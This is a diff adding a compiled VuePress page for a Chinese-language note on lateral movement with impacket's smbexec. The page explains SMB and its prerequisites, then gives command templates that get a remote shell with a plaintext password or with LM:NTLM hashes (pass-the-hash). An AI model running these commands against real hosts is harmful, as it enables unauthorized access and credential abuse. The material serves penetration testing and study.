@@ -1,0 +1,7 @@
+import{_ as e,W as s,X as a,a1 as n}from"./framework-b6a07282.js";const c={},i=n(`<h2 id="smbexec横向移动" tabindex="-1"><a class="header-anchor" href="#smbexec横向移动" aria-hidden="true">#</a> smbexec横向移动</h2><h3 id="smb介绍" tabindex="-1"><a class="header-anchor" href="#smb介绍" aria-hidden="true">#</a> SMB介绍</h3><ul><li>SMB全称时Server Massage Block翻译过来时服务器信息块，它是一种客户端到服务器的通信协议。除此之外，SMB协议也被称为请求-恢复协议。客户端与服务器建立连接后，客户端可以向服务器发送SMB命令允许用户共享、打开、读取或者时写入文件。</li><li>利用条件：开启了445端口，且知道用户域名和密码或LM:NTLM哈希</li></ul><h3 id="smbexec的使用" tabindex="-1"><a class="header-anchor" href="#smbexec的使用" aria-hidden="true">#</a> smbexec的使用</h3><ul><li>smbexec为impacket工具中的工具，操作简单，容易被杀。</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>明文传递：
+smbexec 用户名:明文密码@目标IP <span class="token comment">#成功后在此窗口直接获取shell</span>
+smbexec 域名/用户名:明文密码@目标IP <span class="token comment">#成功后在此窗口直接获取shell</span>
+hash传递：
+smbexec <span class="token parameter variable">-hashes</span> LM哈希:NTLM哈希 用户名@目标IP <span class="token comment">#完整hash需要在cs工具中右键目标主机&gt;转存hash获得</span>
+smbexec <span class="token parameter variable">-hashes</span> LM哈希:NTLM哈希 域名/用户名@目标IP
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,6),l=[i];function r(d,t){return s(),a("div",null,l)}const m=e(c,[["render",r],["__file","smbexec横向移动.html.vue"]]);export{m as default};
